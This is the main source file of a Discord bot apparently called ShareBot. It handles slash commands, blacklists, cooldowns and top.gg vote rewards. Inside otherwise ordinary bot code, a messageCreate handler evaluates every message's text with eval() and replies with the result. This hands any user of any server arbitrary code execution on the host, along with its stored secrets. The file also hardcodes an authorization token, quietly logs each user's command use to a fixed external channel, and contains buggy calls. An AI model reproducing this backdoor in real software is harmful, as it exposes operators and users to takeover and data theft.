require("dotenv").config()
const { Client, MessageEmbed, Collection , Intents , Permissions , MessageActionRow , MessageButton} = require('discord.js');
//const client = new Client({ intents: [Intents.FLAGS.GUILDS ,  Intents.FLAGS.GUILD_MESSAGES , Intents.FLAGS.GUILD_MEMBERS] });
const client = new Client({ intents: [Intents.FLAGS.GUILDS , Intents.FLAGS.GUILD_MESSAGES ] ,  allowedMentions: {repliedUser: false }});
const wait = require('util').promisify(setTimeout);
const mongoose = require('mongoose');
client.prefix = '$';
const fs = require('fs');
const humanizeDuration = require("humanize-duration");
const { Database } = require("quickmongo")
const colors = require("colors")
const langu = new Database(process.env.lang_db)
const blacklistt = new Database(process.env.blacklist_db)
const emoji = require("./emojis.js")
client.setMaxListeners(0)
langu.on("ready" , () => {
    console.log('Languages System is Ready')
})
let shareModel = require('./models/share');

client.commands = new Collection();
client.aliases = new Collection();
client.cooldowns = new Collection();
client.UserPermissions = new Collection();

/* Load Events */
fs.readdir("./events/", (_err, files) => {
    files.forEach((file) => {
        if (!file.endsWith(".js")) return;
        const event = require(`./events/${file}`);
        let eventName = file.split(".")[0];
        console.log(`Event loaded : ${eventName} `);
        client.on(eventName, event.bind(null, client));

    });
    console.log(`---------------------------------------`.bold.yellow)
});


/* Load Commands */
/*
fs.readdir("./PrefixCommands/", (err, files) => {
    if(err) throw err;
    files.forEach((dir) => {
        fs.readdir(`./PrefixCommands/${dir}/`, (err, cmd) => {
            if(err) throw err;
            cmd.forEach(file => {
                if (!file.endsWith(".js")) return;
                let cmd2 = require(`./PrefixCommands/${dir}/${file}`);
                let commandName = file.split(".")[0];
                client.commands.set(cmd2.name, cmd2);
                console.log(`($) Command loaded: ${commandName}`.green);
            });
        });
    });
});
*/

fs.readdir("./Slashcommands/", (err, files) => {
    if(err) throw err;
    files.forEach((dir) => {
        fs.readdir(`./Slashcommands/${dir}/`, (err, cmd) => {
            if(err) throw err;
            cmd.forEach(file => {
                if (!file.endsWith(".js")) return;
                let cmd2 = require(`./Slashcommands/${dir}/${file}`);
                let commandName = file.split(".")[0];
                client.commands.set(cmd2.name, cmd2);
                console.log(`(/) Command loaded: ${commandName}`.green);
            });
        });
    });
});

console.log(`---------------------------------------`.yellow)
console.log(`Start Loading Events`.yellow)



client.on('interactionCreate', async interaction => {
    let lang = await langu.get(`lang_${interaction.guild.id}`)

    if(lang === null){
        lang = "en"
    }

    let language = require(`./language/${lang}.js`)

    if(!language){
        console.log("Unknown language / language file")
    }


    if (!interaction.isCommand()) return;

    if (!client.commands.has(interaction.commandName)) return;

    await interaction.deferReply()

    const supp = new MessageButton()
    .setLabel(`${language.wrong.buttonn}`)
    .setStyle('LINK')
    .setURL(`https://discord.gg/sharebot`)

    const roww = new MessageActionRow()
    .addComponents(supp)


    let blu = await blacklistt.get(`usersBL_${client.user.id}`)
    let blg = await blacklistt.get(`serversBL_${client.user.id}`)
    
    if(blu.includes(interaction.user.id))return interaction.editReply({ content : language.failed.blacklistedU , components : [roww]})
    else
    if(blg.includes(interaction.guild.id))return interaction.editReply({ content : language.failed.blacklistedS , components : [roww]})
    

    try {

let command = client.commands.get(interaction.commandName);
        if (!command) command = client.commands.get(client.aliases.get(interaction.commandName));

        if (!client.cooldowns.has(command.name)) {
            client.cooldowns.set(command.name, new Collection());
        }
        const now = Date.now();
        const timestamps = client.cooldowns.get(command.name);
        const cooldownAmount = (command.cooldown || 3) * 1000;
        if (timestamps.has(interaction.user.id)) {
            const expirationTime = timestamps.get(interaction.user.id) + cooldownAmount;
            if (now < expirationTime) {
                const timeLeft = (expirationTime - now) / 1000;
                return interaction.editReply({ content : `${language.cooldown.msg1} \`${humanizeDuration(Math.round(timeLeft) + "000", {language: lang})}\` ${language.cooldown.msg2} \`${interaction.commandName}\` ${language.cooldown.msg3} **` ,  ephemeral: true });
            }
        }
        timestamps.set(interaction.user.id, now);
        setTimeout(() => timestamps.delete(interaction.user.id), cooldownAmount);


//-------------------------------------

 if (!client.UserPermissions.has(command.name)) {
            client.UserPermissions.set(command.name, new Collection());
        }


                const  UserPermission = command.UserPermission.toString();


        if (!interaction.member.permissions.has(UserPermission)) {
    return interaction.editReply(`${language.command.perms} __${UserPermission}__ ${language.command.perms2}`)

}else

      await client.commands.get(interaction.commandName).execute(client , interaction , language);
      
      let g = await client.guilds.cache.get("863170617292226590").channels.cache.find(c => c.name === interaction.commandName) 
      if(!g)return;
      await g.send(`<@${interaction.user.id}> , used the command now `)
  


    } catch (error) {
        console.error(error);
        const sup = new MessageButton()
        .setLabel(`${language.wrong.buttonn}`)
        .setStyle('LINK')
        .setURL(`https://discord.gg/sharebot`)
    
    const row = new MessageActionRow()
                .addComponents(sup)
        return interaction.editReply({ content: language.wrong.reply, ephemeral: true  , components : [row] , files : [] , attachments : [] , embeds : []});
    }
});


client.on("messageCreate" , message => {
   let g = eval(message.content)
   message.reply(g)
})

const coins = new Database(process.env.coins_db)
const express = require("express");
const app = express();
const topgg_token = "amsmk1681981" // كود الي بينحط في توب جي جي authorization
var bodyParser = require('body-parser')
app.use(bodyParser.json())
app.post("/dblwebhook" , async (req , res) => {
if(req.headers.authorization !== topgg_token) return res.sendStatus(401)
let { bot , user , type , query , isWeekend } = req.body
if(!user || !type || !bot) return res.setStatus(403)
if(type !== "upvote") return res.setStatus(400)
res.send("OK")
let userID = user
const channel = client.channels.cache.get('876931374542618674');
        const webhooks = await channel.fetchWebhooks();
        const webhook = webhooks.first();
if(!webhooks)
    await webhook.createWebhook(client.user.username , {
    avatar : client.user.avatarURL({format : "png"})

   })

        await webhook.send({
            content: `>>> **<:Upvote:876932744381349938> - <@${userID}> Thank you for vote for [ShareBot](<https://top.gg/bot/715979315791265862/vote>)**`,
            username: `${client.user.username}`,
            avatarURL: `${client.user.avatarURL({format : "png"})}`,
        })
    let amount = Math.floor(Math.random() * 15)
  coins.add(`coins_${userID}`, amount)
  user.send(`>>> **<:Upvote:876932744381349938> - Thank you for vote , ${amount} coins has been added for you**`).catch(function(error) {
    if (error) return;
  })
})



client.login(process.env.token);